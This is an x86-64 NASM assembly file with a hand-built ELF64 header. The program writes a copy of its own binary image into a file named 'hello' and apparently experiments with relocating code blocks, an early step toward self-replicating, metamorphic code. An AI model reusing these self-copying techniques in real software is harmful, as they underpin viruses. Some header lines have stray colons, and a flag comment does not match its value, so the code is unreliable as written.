BITS 64
org 0x0                     ; PIE = pas d’adresse fixe

file:
; ELF64 Header (64 bytes)
db 0x7F, "ELF"              ; Magic
db 2                        ; EI_CLASS = ELF64
db 1                        ; EI_DATA = little endian
db 1                        ; EI_VERSION
db 0                        ; EI_OSABI
db 0                        ; EI_ABIVERSION
times 7 db 0                ; padding

dw 3                        ; e_type = ET_DYN (PIE)
dw 0x3E                     ; e_machine = x86_64
dd 1                        ; e_version
dq _start                   ; e_entry (relative to base)
dq 64                       ; e_phoff
dq 0                        ; e_shoff
dd 0                        ; e_flags
dw 64                       ; e_ehsize
dw 56                       ; e_phentsize
dw 1                        ; e_phnum
dw 0                        ; e_shentsize
dw 0                        ; e_shnum
dw 0                        ; e_shstrndx

; Program Header
dd 1                        ; p_type = PT_LOAD
dd 7                        ; p_flags = R | X
dq 0                        ; p_offset
dq 0                        ; p_vaddr
dq 0                        ; p_paddr
dq end_addr - _start:                ; p_filesz
dq end_addr -_start:                ; p_memsz
dq 0x1000                   ; p_align



; %rdi %rsi %rdx %r10 %r8 %r9

_start:
	
	mov	rax, 2
	lea 	rdi, [rel nam]
	mov	rsi, 102
	mov	rdx, 111111111b
	syscall
	cmp	rax, 0
	jl	.continue
	mov	r12, rax
		
	mov	al, [rel ctn]
	inc	al
	mov	[rel ctn], al	

	mov	rax, 1
	mov	rdi, r12
	lea	rsi, [rel file]
	lea	rdx, [rel end_addr]
	lea	rcx, [rel file]
	sub	rdx, rcx
	syscall
	
	mov	rax, 3
	mov	rdi, r12
	syscall

.continue:
	jmp	write
	; 48 8d 05 00 00 00 00 LEA RAX, 0

	; BLOC 0
	msgfind: db 'Found!', 10, 0

	; RDI START, RSI END
	patchjmp:
	jmp	.start
	.nbr:	dq 3
	.adr:	times 3 dq 0
	.blc:	dq 0
	.inc:	dq 0
	.start:	
	; STEP 1 FINDING ADDR
	
	mov	r14, rdi
	mov	r15, rsi	


	jmp	.cont
	.restart:
	pop	rdi
	pop	rsi
	pop	rcx
	mov	rdi, r14
	.cont:
	mov	rcx, r15
	sub	rcx, r14

	.loop_find_addr:
	push	rcx
	push	rsi
	push	rdi	

	mov	rcx, 16
	lea	rsi, [rel .blc]
	
	repe	cmpsb
	jnz	.noeq

	mov	rax, 1
	mov	rdi, 1
	lea	rsi, [rel msgfind]
	mov	rdx, 7
	syscall
	
	mov	rax, [rel .inc]
	imul	rax, 8
	lea	rsi, [rel .adr]
	add	rsi, rax
	mov	[rsi],  rdi
	inc	qword [rel .inc]
	mov	rax, [rel .inc]
	cmp	rax, [rel .nbr]
	jne	.restart	
	.noeq:
	pop	rdi
	pop	rsi
	pop	rcx
	inc	rdi	
	loop	.loop_find_addr


	ret


write:
	lea	rdi, [rel code]	
	lea	rsi, [rel end_code]	

	call	patchjmp	

	code:
	jmp	.next0
	.addr0:	dq 6969
	.next0:
	lea	rax, [rel bloc0]
	mov	[rel .addr0], rax
	jmp	[rel .addr0]
	

	dq	0, 0
	bloc0:
	mov	rax, 1
	mov	rdi, 1
	jmp	msg0	
	db 	'0', 10, 0
	msg0:
	lea	rsi, [rel msg0 - 3]
	mov	rdx, 2
	syscall
	jmp	.next1
	.addr1: dq 6969
	.next1:
	lea	rax, [rel bloc1]
	mov	[rel .addr1], rax
	jmp	[rel .addr1]

	; BLOC 1
	dq	0, 2
	bloc1:
	mov	rax, 1
	mov	rdi, 1
	jmp	msg1	
	db 	'1', 10, 0
	msg1:
	lea	rsi, [rel msg1 - 3]
	mov	rdx, 2
	syscall
	jmp	.next2
	.addr2: dq 6969
	.next2:
	lea	rax, [rel bloc2]
	mov	[rel .addr2], rax
	jmp	[rel .addr2]

	; BLOC 2
	dq	0, 1
	bloc2:
	mov	rax, 1
	mov	rdi, 1
	jmp	msg2	
	db 	'2', 10, 0
	msg2:
	lea	rsi, [rel msg2 - 3]
	mov	rdx, 2
	syscall
	end_code:






	mov	rax, 60
	xor	rdi, rdi
	syscall

	nam: db 'hello'
	ctn: db '0', 0
end_addr:
